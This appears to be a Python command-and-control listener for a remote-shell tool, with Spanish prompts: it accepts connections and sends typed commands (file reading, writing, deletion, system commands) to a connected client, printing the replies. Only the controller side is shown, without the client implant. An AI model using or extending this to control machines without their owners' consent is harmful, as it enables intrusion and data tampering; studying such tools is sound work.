# encoding: utf-8
import socket
import threading
import sys
import os
IP = "Your IP"
PORT = 9112

def main(): 
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f'[*]Esperando por conexiones en {IP}:{PORT}')

    while True:
        client, address = server.accept()
        print(f'[*]Conexión aceptada desde {address[0]}:{address[1]}')
        
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

def handle_client(client_socket):
    with client_socket as sock:
        while True:
            def borrarPantalla():
                os.system ("clear")

            comando = input("$->  ")

            if comando == "exit":
                print("[*]Conexión Cerrada")
                command = comando.encode()
                sock.send(command)
                sys.exit(1)

            elif comando == "help":
                print("Comandos a usar: pwd, cls, read, mkdir, rd, rm, write, touch, sys, cd, ls, cd.., exit.")
            
            elif comando == "":
                command = comando + 'empty'
                command1 = command.encode()
                sock.send(command1)
                request = sock.recv(4096)
                print(request.decode("utf-8"))
            
            elif comando == "cls":
                borrarPantalla()
            
            elif comando[:5] == "write":
                command = comando.encode()
                sock.send(command)
                archivo = input("Que deseas poner en el archivo: ")
                archivos =  archivo.encode()
                sock.send(archivos)
                request = sock.recv(4096)
                print(request.decode("utf-8"))
            
            elif comando[:5] == "touch":
                command = comando.encode()
                sock.send(command)
                archivo = input("Que deseas poner en el archivo: ")
                archivos =  archivo.encode()
                sock.send(archivos)
                request = sock.recv(4096)
                print(request.decode("utf-8"))

            else:
                command = comando.encode()
                sock.send(command)
                request = sock.recv(4096)
                print(request.decode("utf-8"))

        
if __name__ == "__main__":
    main()
    
    
    
